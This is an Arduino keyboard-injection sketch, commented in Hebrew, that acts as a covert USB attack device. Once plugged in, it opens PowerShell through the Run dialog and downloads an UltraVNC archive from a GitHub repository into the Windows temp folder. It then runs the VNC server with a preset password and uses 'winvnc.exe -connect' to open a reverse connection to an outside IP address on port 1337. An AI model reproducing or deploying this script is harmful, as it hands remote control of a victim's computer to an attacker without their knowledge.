#include <Keyboard.h>

// פונקציה ללחיצה על Tab
void pressTab(int times) {
    for (int i = 0; i < times; i++) {
        Keyboard.press(KEY_TAB);
        delay(100);
        Keyboard.release(KEY_TAB);
        delay(100);
    }
}

// פונקציה ללחיצה על Enter
void pressEnter() {
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.release(KEY_RETURN);
    delay(100);
}

void setup() 
{
    Keyboard.begin();
    delay(5000); // המתנה להתחברות המחשב

    // פתיחת PowerShell כמנהל
    Keyboard.press(KEY_LEFT_GUI); // Win
    delay(500); 
    Keyboard.press('r'); // r
    delay(500); 
    Keyboard.release(KEY_LEFT_GUI);
    Keyboard.release('r');
    Keyboard.println("powershell -nop");
    delay(1000);


    // הגדרת פרוטוקול TLS 1.2 (חשוב עבור HTTPS)
    Keyboard.println("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12");  
    delay(1500); 

    // מעבר לתיקיית Temp
    Keyboard.println("cd C:\\Windows\\Temp");  
    delay(1500);    

    // הורדת המאגר כ-ZIP
    Keyboard.println("Invoke-WebRequest -Uri \"https://github.com/orimeged/vnc/archive/refs/heads/main.zip\" -OutFile C:\\Windows\\Temp\\vnc.zip");
    delay(90000); // המתנה להורדה

    // חילוץ ה-ZIP
    Keyboard.println("Expand-Archive -Path C:\\Windows\\Temp\\vnc.zip -DestinationPath C:\\Windows\\Temp");
    delay(3000);

    // מעבר לתיקיית UltraVNC והפעלת winvnc.exe
    Keyboard.println("cd vnc-main\\UltraVNC_1436\\x86");
    delay(3000);
    Keyboard.println(".\\winvnc.exe");
    delay(20000); 

    // הקלדת סיסמה ואישור
    Keyboard.println("12345678"); // סיסמה
    delay(100);
    pressTab(1); // מעבר לשדה האישור
    Keyboard.println("12345678"); // אישור סיסמה
    delay(100);
    pressTab(10); // ניווט בהגדרות (11 Tab ראשונים)
    pressEnter(); // אישור
    delay(3000);
    pressTab(30); // ניווט נוסף (20 Tab שניים)
    pressEnter(); // אישור
    delay(100);
    pressEnter(); // אישור נוסף
    delay(1000);

    // הפעלת winvnc.exe עם חיבור ל-IP
    Keyboard.println(".\\winvnc.exe -connect 77.127.127.194:1337");
    delay(3000);

    // סגירת PowerShell
    //Keyboard.println("Exit");
    
    Keyboard.end();
}

void loop()
{
    // כלום, הקוד רץ פעם אחת
}
